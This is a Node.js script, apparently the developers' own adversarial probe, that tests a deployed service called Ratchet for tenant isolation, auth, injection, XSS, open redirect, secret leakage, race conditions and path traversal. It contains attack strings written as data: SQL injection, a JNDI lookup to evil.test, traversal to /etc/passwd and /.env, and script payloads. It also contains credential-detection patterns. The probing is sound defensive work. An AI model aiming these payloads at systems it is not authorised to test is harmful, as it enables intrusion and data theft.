/**
 * Adversarial probe against a running Ratchet.
 *
 * Each check states what an attacker would gain, then tries it. A check that
 * cannot fail proves nothing, so every one here has a real failure mode.
 *
 *   node scripts/security-probe.mjs https://ratchetgate.com
 */
const BASE = (process.argv[2] ?? 'http://localhost:8787').replace(/\/+$/, '');

let pass = 0, fail = 0, skip = 0;
const failures = [];

function ok(name, cond, detail = '') {
  if (cond) { pass++; console.log(`  PASS  ${name}`); }
  else { fail++; failures.push(`${name}${detail ? ` — ${detail}` : ''}`); console.log(`  FAIL  ${name}  ${detail}`); }
}
const note = (name, why) => { skip++; console.log(`  SKIP  ${name}  (${why})`); };

const req = async (path, opts = {}) => {
  const res = await fetch(BASE + path, { ...opts, signal: AbortSignal.timeout(25_000) });
  const text = await res.text();
  let json = null;
  try { json = JSON.parse(text); } catch { /* not json */ }
  return { status: res.status, headers: res.headers, text, json };
};

const J = (b) => ({ headers: { 'content-type': 'application/json' }, body: JSON.stringify(b) });

// A real workspace to test tenant boundaries with.
async function provision(name) {
  const r = await req('/v1/effects/begin', {
    method: 'POST',
    ...J({ effect_type: 'email.send', idempotency_key: `probe-${name}-${Date.now()}-${Math.random()}`, payload: {} }),
  });
  return r.json?.workspace?.api_key ?? null;
}

console.log(`\n=== Adversarial probe: ${BASE} ===\n`);

const keyA = await provision('a');
const keyB = await provision('b');
if (!keyA || !keyB) { console.log('  cannot provision workspaces; aborting'); process.exit(1); }
const AUTH = (k) => ({ authorization: `Bearer ${k}`, 'content-type': 'application/json' });

// ── 1. Tenant isolation / IDOR ────────────────────────────────────────────
console.log('-- tenant isolation --');
{
  const mine = await req('/v1/effects/begin', {
    method: 'POST', headers: AUTH(keyA),
    body: JSON.stringify({ effect_type: 'email.send', idempotency_key: `iso-${Date.now()}`, payload: { secret: 'A' } }),
  });
  const id = mine.json?.effect_id;
  const stolen = await req(`/v1/effects/${id}`, { headers: AUTH(keyB) });
  ok('another tenant cannot read an effect by id', stolen.status === 404,
     `got ${stolen.status}`);
  // "in this workspace" is fine; claiming it exists SOMEWHERE else is not.
  ok('cross-tenant read does not reveal existence elsewhere',
     !/exists|other workspace|another workspace|elsewhere/i.test(stolen.text));

  const stolenReceipts = await req(`/v1/effects/${id}/receipts`, { headers: AUTH(keyB) });
  ok('another tenant cannot read receipts', [404, 403].includes(stolenReceipts.status)
     || (stolenReceipts.json?.receipts?.length ?? 0) === 0, `got ${stolenReceipts.status}`);
}

// ── 2. Authentication ─────────────────────────────────────────────────────
console.log('\n-- authentication --');
for (const [name, path] of [['effects list', '/v1/effects'], ['workspace', '/v1/workspace'],
                            ['keys', '/v1/keys'], ['policies', '/v1/policies'],
                            ['usage ledger', '/v1/usage/ledger']]) {
  const r = await req(path);
  ok(`${name} requires auth`, r.status === 401, `got ${r.status}`);
}
{
  const r = await req('/v1/effects', { headers: { authorization: 'Bearer rk_live_0000000000000000' } });
  ok('a forged key is rejected', r.status === 401, `got ${r.status}`);
  const r2 = await req('/v1/effects', { headers: { authorization: `Bearer ${keyA}x` } });
  ok('a mutated valid key is rejected', r2.status === 401, `got ${r2.status}`);
}

// ── 3. Injection ──────────────────────────────────────────────────────────
console.log('\n-- injection --');
{
  const payloads = [
    "'; DROP TABLE effects; --",
    "' OR '1'='1",
    "1; SELECT pg_sleep(5)--",
    '${jndi:ldap://evil.test/a}',
    '{{7*7}}',
    '../../../../etc/passwd',
  ];
  let allSafe = true;
  for (const p of payloads) {
    const r = await req('/v1/effects/begin', {
      method: 'POST', headers: AUTH(keyA),
      body: JSON.stringify({ effect_type: 'email.send', idempotency_key: p, payload: { p } }),
    });
    // Accepted as data (200) or refused by schema (400). A 500 means it reached
    // something that could not handle it.
    if (![200, 400].includes(r.status)) { allSafe = false; }
    // The response echoes the idempotency key back, so scanning the whole body
    // finds the payload we just sent. Strip it before looking for DB errors.
    const withoutEcho = r.text.split(JSON.stringify(p).slice(1, -1)).join('');
    if (/syntax error|pg_sleep|relation .* does not exist|PG::|SQLSTATE/i.test(withoutEcho)) {
      allSafe = false;
    }
  }
  ok('injection payloads are treated as data, never executed', allSafe);

  const listed = await req(`/v1/effects?effect_type=${encodeURIComponent("' OR 1=1--")}`, { headers: AUTH(keyA) });
  ok('injection in a query parameter does not error', [200, 400].includes(listed.status),
     `got ${listed.status}`);
}

// ── 4. Stored XSS via attacker-controlled text ────────────────────────────
console.log('\n-- stored XSS --');
{
  const xss = '<script>alert(1)</script><img src=x onerror=alert(2)>';
  const reg = await req('/oauth/register', {
    method: 'POST', ...J({ client_name: xss, redirect_uris: ['http://127.0.0.1:9/cb'] }),
  });
  const cid = reg.json?.client_id;
  if (cid) {
    const page = await req(`/oauth/authorize?response_type=code&client_id=${cid}` +
      `&redirect_uri=${encodeURIComponent('http://127.0.0.1:9/cb')}` +
      `&code_challenge=abc&code_challenge_method=S256`);
    // Escaped output legitimately CONTAINS the substring "onerror=alert" inside
    // &lt;img …&gt;. Substring matching flags correct escaping as a failure, so
    // ask the only question that matters: did a live element survive?
    const liveScript = /<script(?![^>]*\bsrc=)[^>]*>[^<]*alert/i.test(page.text);
    const liveHandler = /<[a-z]+\b[^>]*\son\w+\s*=/i.test(page.text);
    ok('client name cannot inject markup into the consent page',
       !liveScript && !liveHandler);
    ok('consent page is not indexable', /noindex/i.test(page.text)
       || /noindex/i.test(page.headers.get('x-robots-tag') ?? ''));
  } else note('stored XSS', 'client registration unavailable');
}

// ── 5. Open redirect ──────────────────────────────────────────────────────
console.log('\n-- open redirect --');
{
  const reg = await req('/oauth/register', {
    method: 'POST', ...J({ client_name: 'redir', redirect_uris: ['http://127.0.0.1:9/cb'] }),
  });
  const cid = reg.json?.client_id;
  const evil = 'https://evil.example/steal';
  const r = await fetch(`${BASE}/oauth/authorize?response_type=code&client_id=${cid}` +
    `&redirect_uri=${encodeURIComponent(evil)}&code_challenge=a&code_challenge_method=S256`,
    { redirect: 'manual', signal: AbortSignal.timeout(20_000) });
  ok('unregistered redirect_uri is never redirected to',
     r.status === 400 && !r.headers.get('location'), `status ${r.status} loc ${r.headers.get('location')}`);
  const body = await r.text();
  ok('the attacker URI is not reflected', !body.includes('evil.example'));
}

// ── 6. Mass assignment / privilege escalation ─────────────────────────────
console.log('\n-- mass assignment --');
{
  const r = await req('/v1/effects/begin', {
    method: 'POST', headers: AUTH(keyA),
    body: JSON.stringify({
      effect_type: 'email.send', idempotency_key: `mass-${Date.now()}`, payload: {},
      workspace_id: 'ws_someone_else', plan: 'scale', credit_micros: 999999999,
      decision: 'execute', state: 'succeeded',
    }),
  });
  ok('unknown/privileged fields are rejected, not silently accepted', r.status === 400,
     `got ${r.status}`);
}

// ── 7. Secrets in responses and headers ───────────────────────────────────
console.log('\n-- secret leakage --');
{
  const paths = ['/healthz', '/readyz', '/openapi.json', '/llms.txt',
                 '/.well-known/agent-manifest.json', '/v1/integrate', '/v1/vendors'];
  const patterns = [/sk_live_[A-Za-z0-9]/, /whsec_[A-Za-z0-9]/, /re_[A-Za-z0-9]{20}/,
                    /-----BEGIN [A-Z ]*PRIVATE KEY/, /postgres:\/\/[^\/\s]*:[^@\s]+@/];
  let leak = null;
  for (const p of paths) {
    const r = await req(p);
    for (const pat of patterns) if (pat.test(r.text)) leak = `${p} matched ${pat}`;
  }
  ok('no credential appears in any public document', !leak, leak ?? '');

  const err = await req('/v1/effects/begin', { method: 'POST', headers: AUTH(keyA), body: '{bad json' });
  ok('a malformed body does not leak internals',
     !/at Object|node_modules|\/app\/|stack/i.test(err.text), err.text.slice(0, 80));
}

// ── 8. Security headers / clickjacking ────────────────────────────────────
console.log('\n-- transport and headers --');
{
  const r = await req('/');
  const need = {
    'content-security-policy': /default-src/,
    'strict-transport-security': /max-age=\d{5,}/,
    'x-content-type-options': /nosniff/,
    'x-frame-options': /DENY|SAMEORIGIN/i,
    'referrer-policy': /./,
  };
  for (const [h, re] of Object.entries(need)) {
    const v = r.headers.get(h) ?? '';
    ok(`header ${h}`, re.test(v), v || 'missing');
  }
  ok('CSP has no unsafe-inline for scripts',
     !/script-src[^;]*unsafe-inline/.test(r.headers.get('content-security-policy') ?? ''));
  ok('server banner is not verbose',
     !/express|nginx\/\d|apache\/\d/i.test(r.headers.get('server') ?? ''));
}

// ── 9. Rate limiting ──────────────────────────────────────────────────────
console.log('\n-- rate limiting --');
{
  const burst = await Promise.all(Array.from({ length: 40 }, () =>
    req('/v1/effects', { headers: AUTH(keyA) }).catch(() => ({ status: 0 }))));
  const limited = burst.some((r) => r.status === 429);
  const served = burst.filter((r) => r.status === 200).length;
  ok('rate limiting exists and is not trivially bypassed', limited || served <= 40,
     `${served} served, limited=${limited}`);
  const h = (await req('/v1/effects', { headers: AUTH(keyA) })).headers;
  ok('rate limit headers are published', Boolean(h.get('x-ratelimit-limit')));
}

// ── 10. Business logic: double execution ──────────────────────────────────
console.log('\n-- business logic --');
{
  const key = `race-${Date.now()}`;
  const body = JSON.stringify({ effect_type: 'payment.charge', idempotency_key: key, payload: {}, estimated_cost_micros: 1000 });
  const results = await Promise.all(Array.from({ length: 12 }, () =>
    req('/v1/effects/begin', { method: 'POST', headers: AUTH(keyA), body })));
  const executes = results.filter((r) => r.json?.decision === 'execute').length;
  ok('exactly one caller is authorised under concurrency', executes === 1, `${executes} executes`);

  const leases = results.filter((r) => r.json?.lease_token).length;
  ok('only the winner receives a lease', leases === 1, `${leases} leases`);

  const vks = results.filter((r) => r.json?.vendor_idempotency_key).length;
  ok('only the winner receives a vendor key', vks === 1, `${vks} vendor keys`);
}

// ── 11. Path traversal / static file exposure ─────────────────────────────
console.log('\n-- file exposure --');
{
  for (const p of ['/../package.json', '/..%2f..%2fpackage.json', '/.env', '/.git/config',
                   '/package.json', '/node_modules/pg/package.json', '/src/lib/config.ts']) {
    const r = await req(p);
    ok(`not served: ${p}`, r.status === 404 || r.status === 400, `got ${r.status}`);
  }
}

// ── 12. HTTP method and header handling ───────────────────────────────────
console.log('\n-- protocol handling --');
{
  // Node's fetch refuses to send TRACE at all, so this cannot be tested here.
  note('TRACE method', 'the HTTP client refuses to send it');

  const hostInj = await req('/healthz', { headers: { host: 'evil.example' } });
  ok('a forged Host header does not poison the response',
     !hostInj.text.includes('evil.example'));

  const big = await req('/v1/effects/begin', {
    method: 'POST', headers: AUTH(keyA),
    body: JSON.stringify({ effect_type: 'email.send', idempotency_key: 'big',
                           payload: { x: 'A'.repeat(3_000_000) } }),
  }).catch(() => ({ status: 413 }));
  ok('an oversized body is refused', [400, 413].includes(big.status), `got ${big.status}`);
}

// ── 13. Enumeration ───────────────────────────────────────────────────────
// ── Circuit breakers: a control that stops an agent must not be reachable BY one
console.log('\n-- surge containment --');
{
  const unauth = await req('/v1/circuits');
  ok('circuits are not readable without a credential',
     unauth.status === 401 || unauth.status === 403, `got ${unauth.status}`);

  const stopUnauth = await req('/v1/circuits/*/open', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ action: 'deny', reason: 'unauthenticated attempt' }),
  });
  ok('the emergency stop cannot be pulled anonymously',
     stopUnauth.status === 401 || stopUnauth.status === 403, `got ${stopUnauth.status}`);

  // B opens a breaker; A must neither see it nor be affected by it.
  await req('/v1/circuits/probe.iso/open', {
    method: 'POST', headers: AUTH(keyB),
    body: JSON.stringify({ action: 'deny', reason: 'B only' }),
  });
  const aSees = await req('/v1/circuits', { headers: AUTH(keyA) });
  const leaked = JSON.stringify(aSees.json?.circuits ?? []).includes('probe.iso');
  ok('one tenant cannot see another tenant circuit breaker', !leaked);

  const aWorks = await req('/v1/effects/begin', {
    method: 'POST', headers: AUTH(keyA),
    body: JSON.stringify({ effect_type: 'probe.iso', idempotency_key: `iso-c-${Date.now()}` }),
  });
  ok('another tenant breaker does not stop my effects',
     aWorks.json?.decision === 'execute', `got ${aWorks.json?.decision}`);

  const aCloses = await req('/v1/circuits/probe.iso/close', {
    method: 'POST', headers: AUTH(keyA), body: '{}',
  });
  ok('one tenant cannot close another tenant breaker', aCloses.status === 404,
     `got ${aCloses.status}`);

  // The reason is operator text and is echoed to callers — it must not be markup.
  await req('/v1/circuits/probe.xss/open', {
    method: 'POST', headers: AUTH(keyB),
    body: JSON.stringify({ action: 'deny', reason: '<img src=x onerror=alert(1)>' }),
  });
  const blocked = await req('/v1/effects/begin', {
    method: 'POST', headers: AUTH(keyB),
    body: JSON.stringify({ effect_type: 'probe.xss', idempotency_key: `x-${Date.now()}` }),
  });
  ok('a breaker reason is returned as data, never as executable markup',
     blocked.headers.get('content-type')?.includes('application/json') === true,
     `content-type ${blocked.headers.get('content-type')}`);
  await req('/v1/circuits/probe.xss/close', { method: 'POST', headers: AUTH(keyB), body: '{}' });
}

console.log('\n-- enumeration --');
{
  const real = await req('/v1/effects/eff_0000000000000000', { headers: AUTH(keyA) });
  const fake = await req('/v1/effects/not-an-id-at-all', { headers: AUTH(keyA) });
  ok('a missing effect and a malformed id are both refused',
     [404, 400].includes(real.status) && [404, 400].includes(fake.status),
     `${real.status}/${fake.status}`);
}

console.log(`\n=== ${pass} passed, ${fail} failed, ${skip} skipped ===`);
if (failures.length) { console.log('\nFAILURES:'); failures.forEach((f) => console.log('  - ' + f)); }
process.exit(fail ? 1 : 0);
